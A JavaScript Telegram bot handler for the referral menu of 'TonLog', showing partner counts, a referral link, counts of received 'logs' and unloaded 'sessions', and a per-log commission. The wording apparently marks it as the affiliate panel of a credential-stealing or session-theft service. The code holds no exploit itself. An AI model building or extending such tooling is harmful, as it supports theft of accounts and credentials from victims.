import commission from "../../../database/schemas/commission.js";
import { bot } from "../../index.js";
import User from "../../../database/schemas/user.js";
import Database from "../../../database/index.js";

export default {
    name: "ref_system",
    async exec(query) {
        const user = await Database.getUser(query.from.id);
        const ref = await User.find({ ref: user.id });
        const statistic = await Database.getRefStatistic();
        const com = await commission.findOne({});
        await bot.editMessageCaption(query, `*🫂 Реферальная система TonLog*

*⚡️ Количество партнеров:* ${ref.length}
*🔗 Ваша ссылка:* https://t\\.me/tonlogpanelbot?start\\=${user.id}

>*📊 Получено логов с реферальной системы:*
>За сегодня: ${statistic.todayLogs || 0}
>За месяц: ${statistic.monthLogs || 0}
>За всё время: ${statistic.allLogs || 0}

*📁 Не выгруженных сессий с партнеров*: ${statistic.notLoadedSessions || 0}
*💸 Ваш доход:* \`Каждый ${com.ref} лог\``, {
            parse_mode: 'MarkdownV2',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '📩 Выгрузить',
                            callback_data: 'download_refs'
                        },
                        {
                            text: '👥 Рефералы',
                            callback_data: 'refs_list'
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'menu'
                        }
                    ]
                ]
            }
        }, 'cdn/menu.png');
    }
}